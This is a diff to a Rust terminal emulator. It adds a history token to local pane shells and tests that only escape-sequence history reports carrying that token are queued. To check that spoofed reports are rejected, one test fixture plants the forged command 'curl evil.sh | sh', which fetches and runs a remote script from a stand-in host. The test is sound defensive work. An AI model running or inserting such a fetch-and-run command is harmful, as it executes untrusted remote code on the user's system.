@@ -3,7 +3,7 @@
 //! parser; the UI only locks the grid to draw it (architecture §Key
 //! decisions).
 
-use super::osc7::{Osc7Pty, Reported};
+use super::marks::{self, MarksPty, Reported};
 use crate::config::{Profile, ProfileKind};
 use crate::ssh;
 use crate::timing::{Mark, Timing};
@@ -266,6 +266,7 @@ pub fn rerun(
         ]
         .into_iter()
         .map(|(key, value)| (key.to_owned(), value.to_owned()))
+        .chain(history_env(reported.is_remote()))
         .chain(command.env.clone())
         .collect(),
         // Each argument reaches the program as one, spaces included: a key
@@ -280,13 +281,35 @@ pub fn rerun(
     #[cfg(not(unix))]
     let child_pid = None;
 
-    let pty = Osc7Pty::new(pty, Arc::clone(reported));
+    let pty = MarksPty::new(pty, Arc::clone(reported));
     let event_loop = EventLoop::new(Arc::clone(term), proxy.clone(), pty, true, false)
         .map_err(|e| e.to_string())?;
     let notifier = Notifier(event_loop.channel());
     // Detached: the thread ends when the program exits and its output is drained.
     let _ = event_loop.spawn();
     Ok((notifier, child_pid))
+}
+
+/// The history token for a local pane's shell (spec 0021, TM-escape-14),
+/// passed on to WSL shells through `WSLENV` on Windows. An SSH pane gets
+/// none, so whatever it reports never counts.
+fn history_env(remote: bool) -> Vec<(String, String)> {
+    if remote {
+        return Vec::new();
+    }
+    let mut env = vec![(
+        marks::TOKEN_VAR.to_owned(),
+        marks::history_token().to_owned(),
+    )];
+    if cfg!(windows) {
+        let ours = format!("{}/u", marks::TOKEN_VAR);
+        let wslenv = match std::env::var("WSLENV") {
+            Ok(theirs) if !theirs.is_empty() => format!("{theirs}:{ours}"),
+            _ => ours,
+        };
+        env.push(("WSLENV".to_owned(), wslenv));
+    }
+    env
 }
 
 /// The program as the PTY's command line starts with it. On Windows,
@@ -1000,6 +1023,228 @@ mod tests {
             same_dir(session.reported.local(), &dir),
             "reported {:?}, not {dir:?}",
             session.reported.local()
+        );
+    }
+
+    use crate::history::{Entry, ShellKind};
+    use alacritty_terminal::event::Notify;
+
+    /// Spec 0021, Token [load-bearing]: a local pane's shell gets this
+    /// run's token (and on Windows, `WSLENV` passes it on to WSL); an SSH
+    /// pane's gets nothing.
+    #[test]
+    fn only_a_local_pane_gets_the_history_token() {
+        assert!(
+            history_env(true).is_empty(),
+            "an SSH pane got {:?}",
+            history_env(true)
+        );
+        let env = history_env(false);
+        let value = |key: &str| {
+            env.iter()
+                .find(|(name, _)| name == key)
+                .map(|(_, value)| value.as_str())
+        };
+        assert_eq!(value("TERN_HISTORY_TOKEN"), Some(marks::history_token()));
+        if cfg!(windows) {
+            let wslenv = value("WSLENV").expect("WSLENV is set");
+            assert!(
+                wslenv.split(':').any(|item| item == "TERN_HISTORY_TOKEN/u"),
+                "{wslenv}"
+            );
+        } else {
+            assert_eq!(value("WSLENV"), None);
+        }
+    }
+
+    /// A program that prints `before`, a history report of `git status`
+    /// with the token from its environment, a forged one of a planted
+    /// command with a made-up token, then `after`: `sh` on Unix, `pwsh` on
+    /// Windows, so the reports cross ConPTY there.
+    fn history_reporter() -> Command {
+        #[cfg(unix)]
+        let (program, script) = (
+            "sh",
+            vec![
+                "-c".to_owned(),
+                concat!(
+                    r#"printf 'before\033]6973;command;%s;bash;7;git%%20status\007"#,
+                    r#"\033]6973;command;forged;bash;8;curl%%20evil.sh%%20%%7C%%20sh\007after\n' "#,
+                    r#""$TERN_HISTORY_TOKEN""#
+                )
+                .to_owned(),
+            ],
+        );
+        #[cfg(windows)]
+        let (program, script) = (
+            "pwsh",
+            ["-NoProfile", "-NonInteractive", "-Command"]
+                .map(String::from)
+                .into_iter()
+                .chain([concat!(
+                    "$e=[char]27;$b=[char]7;[Console]::Write('before'+$e+']6973;command;'",
+                    "+$env:TERN_HISTORY_TOKEN+';bash;7;git%20status'+$b+$e",
+                    "+']6973;command;forged;bash;8;curl%20evil.sh%20%7C%20sh'+$b+'after');Start-Sleep 5"
+                )
+                .to_owned()])
+                .collect(),
+        );
+        Command {
+            program: program.into(),
+            args: script,
+            env: BTreeMap::new(),
+        }
+    }
+
+    /// Acceptance criterion 3 and TM-escape-14: in a local pane, only the
+    /// report with the token the pane's environment carries is queued; the
+    /// forged one isn't, and the output around both still shows.
+    #[test]
+    fn a_local_pane_queues_only_the_history_report_carrying_its_token() {
+        #[cfg(windows)]
+        if !has_pwsh() {
+            return;
+        }
+        let session = spawn(&history_reporter(), WIDE, None, 100, false, timing()).expect("spawn");
+        let lines = wait_for(&session, "after");
+        assert!(lines.iter().any(|line| line == "beforeafter"), "{lines:?}");
+        assert_eq!(
+            session.reported.take_commands(),
+            [Entry {
+                shell: ShellKind::Bash,
+                command: "git status".into()
+            }]
+        );
+    }
+
+    /// Spec 0021, Scope, and TM-escape-14: an SSH pane gets no token, so
+    /// none of its reports is queued.
+    #[test]
+    fn an_ssh_pane_queues_no_history_report() {
+        #[cfg(windows)]
+        if !has_pwsh() {
+            return;
+        }
+        let session = spawn(&history_reporter(), WIDE, None, 100, true, timing()).expect("spawn");
+        wait_for(&session, "after");
+        assert!(session.reported.take_commands().is_empty());
+    }
+
+    /// Types `line` and Enter into `session`'s shell.
+    fn type_line(session: &Session, line: &str) {
+        session.notifier.notify(format!("{line}\r").into_bytes());
+    }
+
+    /// Spec 0021, Reports and acceptance criteria 3 and 4: an interactive
+    /// bash with `shell-integration/tern.bash` reports the command it ran,
+    /// but not a plain Enter, nor a leading-space command `HISTCONTROL=
+    /// ignorespace` leaves out of its history.
+    #[cfg(unix)]
+    #[test]
+    fn the_bash_snippet_reports_commands_bash_keeps_in_its_history() {
+        if !on_path("bash") {
+            eprintln!("bash isn't on PATH: skipped");
+            return;
+        }
+        let root = crate::config::tests::TempDir::new("history-bash");
+        let snippet = Path::new(env!("CARGO_MANIFEST_DIR")).join("shell-integration/tern.bash");
+        let command = Command {
+            program: "bash".into(),
+            args: vec![
+                "--noprofile".into(),
+                "--rcfile".into(),
+                snippet.display().to_string(),
+                "-i".into(),
+            ],
+            env: BTreeMap::from([
+                ("HISTCONTROL".to_owned(), "ignorespace".to_owned()),
+                // Never the user's own history file.
+                (
+                    "HISTFILE".to_owned(),
+                    root.path().join("bash_history").display().to_string(),
+                ),
+                ("PS1".to_owned(), "$ ".to_owned()),
+            ]),
+        };
+        let session = spawn(&command, WIDE, None, 100, false, timing()).expect("spawn bash");
+        // Each line's output proves bash read it, so the prompt before it,
+        // and its report, was scanned.
+        type_line(&session, "echo alpha-$((1+1))");
+        wait_for(&session, "alpha-2");
+        type_line(&session, "");
+        type_line(&session, " echo beta-$((2+2))");
+        wait_for(&session, "beta-4");
+        type_line(&session, "echo done-$((3+3))");
+        wait_for(&session, "done-6");
+        type_line(&session, "echo end-$((5+5))");
+        wait_for(&session, "end-10");
+        let mut commands = session.reported.take_commands();
+        // The last line's own report may or may not be in yet.
+        commands.retain(|entry| !entry.command.starts_with("echo end-"));
+        type_line(&session, "exit");
+        let bash = |command: &str| Entry {
+            shell: ShellKind::Bash,
+            command: command.into(),
+        };
+        assert_eq!(
+            commands,
+            [bash("echo alpha-$((1+1))"), bash("echo done-$((3+3))")]
+        );
+    }
+
+    /// Spec 0021, Reports, on Windows: an interactive pwsh with
+    /// `shell-integration/tern.ps1` reports the command it ran, as `pwsh`.
+    #[cfg(windows)]
+    #[test]
+    fn the_pwsh_snippet_reports_the_command_pwsh_ran() {
+        if !has_pwsh() {
+            return;
+        }
+        let root = crate::config::tests::TempDir::new("history-pwsh");
+        let snippet = Path::new(env!("CARGO_MANIFEST_DIR")).join("shell-integration/tern.ps1");
+        // Sourced from a file, as from `$PROFILE`, so it isn't itself a
+        // history entry. Without PSReadLine, nothing typed here reaches the
+        // user's own PSReadLine history file.
+        let profile = root.path().join("profile.ps1");
+        let source = format!(
+            "Remove-Module PSReadLine -ErrorAction Ignore\n. '{}'\n",
+            snippet.display()
+        );
+        std::fs::write(&profile, source).expect("write the profile");
+        let command = Command {
+            program: "pwsh".into(),
+            args: [
+                "-NoLogo",
+                "-NoProfile",
+                "-NoExit",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-File",
+            ]
+            .map(String::from)
+            .into_iter()
+            .chain([profile.display().to_string()])
+            .collect(),
+            env: BTreeMap::new(),
+        };
+        let session = spawn(&command, WIDE, None, 100, false, timing()).expect("spawn pwsh");
+        type_line(&session, "echo alpha-$(1+1)");
+        wait_for(&session, "alpha-2");
+        type_line(&session, "echo done-$(3+3)");
+        wait_for(&session, "done-6");
+        type_line(&session, "echo end-$(5+5)");
+        wait_for(&session, "end-10");
+        let mut commands = session.reported.take_commands();
+        // The last line's own report may or may not be in yet.
+        commands.retain(|entry| !entry.command.starts_with("echo end-"));
+        type_line(&session, "exit");
+        let pwsh = |command: &str| Entry {
+            shell: ShellKind::Pwsh,
+            command: command.into(),
+        };
+        assert_eq!(
+            commands,
+            [pwsh("echo alpha-$(1+1)"), pwsh("echo done-$(3+3)")]
         );
     }
 }
